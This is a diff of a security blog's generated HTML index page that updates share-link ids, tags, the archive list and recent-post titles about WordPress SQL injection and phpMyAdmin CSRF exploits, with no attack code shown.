-      <a data-url="http://blog.vulnspy.com/2017/11/09/Wordpress-4-8-2-SQL-Injection-POC/" data-id="cjgcd0arj0003vks6q6mbow6g" class="article-share-link">Share</a>
+      <a data-url="http://blog.vulnspy.com/2017/11/09/Wordpress-4-8-2-SQL-Injection-POC/" data-id="cjib28b7f0003hzpvlatg00v8" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞分析/">漏洞分析</a></li></ul>
@@ -206,7 +381,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://blog.vulnspy.com/2017/09/05/Wordpress-POST-META-Check-Bypass/" data-id="cjgcd0arv0008vks62sng5g7i" class="article-share-link">Share</a>
+      <a data-url="http://blog.vulnspy.com/2017/09/05/Wordpress-POST-META-Check-Bypass/" data-id="cjib28b7i0004hzpvzqmklfdn" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞分析/">漏洞分析</a></li></ul>
@@ -305,7 +480,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://blog.vulnspy.com/2017/09/03/Wordpress-SQL-Injection-Analysis-2/" data-id="cjgcd0ars0005vks66ytwfnrn" class="article-share-link">Share</a>
+      <a data-url="http://blog.vulnspy.com/2017/09/03/Wordpress-SQL-Injection-Analysis-2/" data-id="cjib28b7w0008hzpvk9kjsjii" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞分析/">漏洞分析</a></li></ul>
@@ -408,7 +583,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://blog.vulnspy.com/2017/09/02/Wordpress-SQL-Injection-Analysis-1/" data-id="cjgcd0arn0004vks6moxxi7oz" class="article-share-link">Share</a>
+      <a data-url="http://blog.vulnspy.com/2017/09/02/Wordpress-SQL-Injection-Analysis-1/" data-id="cjib28b7n0005hzpvpz8w8187" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞分析/">漏洞分析</a></li></ul>
@@ -509,7 +684,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://blog.vulnspy.com/2017/08/12/SSRF-And-URL-Related-TIPS/" data-id="cjgcd0are0001vks6xhjssck0" class="article-share-link">Share</a>
+      <a data-url="http://blog.vulnspy.com/2017/08/12/SSRF-And-URL-Related-TIPS/" data-id="cjib28b740000hzpvgrquj7pd" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/渗透测试/">渗透测试</a></li></ul>
@@ -693,7 +868,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://blog.vulnspy.com/2017/08/02/Local-Privilege-Escalation-Tips/" data-id="cjgcd0ar90000vks6fanxlyyn" class="article-share-link">Share</a>
+      <a data-url="http://blog.vulnspy.com/2017/08/02/Local-Privilege-Escalation-Tips/" data-id="cjib28b790001hzpv4u8w6yy2" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/渗透测试/">渗透测试</a></li></ul>
@@ -745,7 +920,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">标签</h3>
     <div class="widget">
-      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/渗透测试/">渗透测试</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/漏洞分析/">漏洞分析</a></li></ul>
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Exploit/">Exploit</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/渗透测试/">渗透测试</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/漏洞分析/">漏洞分析</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/漏洞利用/">漏洞利用</a></li></ul>
     </div>
   </div>
 
@@ -755,7 +930,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">归档</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">十一月 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">九月 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">八月 2017</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">六月 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">十一月 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">九月 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">八月 2017</a></li></ul>
     </div>
   </div>
 
@@ -768,6 +943,14 @@
       <ul>
         
           <li>
+            <a href="/2018/06/12/phpMyAdmin-4-7-x-XSRF-CSRF-vulnerability-PMASA-2017-9-exploit/">phpMyAdmin 4.7.x XSRF/CSRF Vulnerability (PMASA-2017-9) Exploit</a>
+          </li>
+        
+          <li>
+            <a href="/2018/06/10/phpMyAdmin-4-7-x-XSRF-CSRF-vulnerability-exploit/">phpMyAdmin 4.7.x CSRF 漏洞利用</a>
+          </li>
+        
+          <li>
             <a href="/2017/11/09/Wordpress-4-8-2-SQL-Injection-POC/">Wordpress &lt;= 4.8.2 SQL Injection POC</a>
           </li>
         
@@ -777,14 +960,6 @@
         
           <li>
             <a href="/2017/09/03/Wordpress-SQL-Injection-Analysis-2/">Wordpress SQL注入分析（二）</a>
-          </li>
-        
-          <li>
-            <a href="/2017/09/02/Wordpress-SQL-Injection-Analysis-1/">Wordpress SQL注入分析（一）</a>
-          </li>
-        
-          <li>
-            <a href="/2017/08/12/SSRF-And-URL-Related-TIPS/">SSRF And URL Related TIPS</a>
           </li>
         
       </ul>
